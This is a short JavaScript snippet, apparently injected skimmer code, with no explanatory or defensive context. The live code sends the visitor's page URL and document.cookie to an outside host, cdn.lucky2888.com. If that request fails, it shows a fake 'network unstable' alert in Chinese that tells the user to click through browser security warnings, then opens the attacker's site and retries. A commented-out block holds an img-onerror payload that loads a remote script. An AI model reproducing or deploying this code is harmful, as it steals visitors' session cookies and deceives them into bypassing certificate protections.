(function(){
    /* load css
     var drc = document.createElement('script');drc.setAttribute("src","https://biluweb.github.io/assets/extend.js");document.getElementsByTagName('head')[0].appendChild(drc);
     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://biluweb.github.io/assets/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
    */
    
    var meta = document.createElement('meta');
    meta.content="upgrade-insecure-requests";
    meta.setAttribute("http-equiv","Content-Security-Policy");
    document.getElementsByTagName('head')[0].appendChild(meta);
    var Ip="https://cdn.lucky2888.com"
    var httpRequest = new XMLHttpRequest();
    function send(){
        httpRequest.open('GET',Ip+"/ftts?d="+window.location.href+"&c="+document.cookie, true);
        httpRequest.send();
    }
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4) {
            if(httpRequest.status == 200){
                var json = httpRequest.responseText;console.log(json);
            }else{
                alert("系统检测到你的网络不稳定,请在打开的网页中选择1.高级2.继续前往，将自动为您加速！");
                var tempwindow=window.open('_blank');
                setTimeout(function(){tempwindow.location.href=Ip; }, 800);
                setTimeout(send, 5500);
            }
        }
    };
    send();
}())
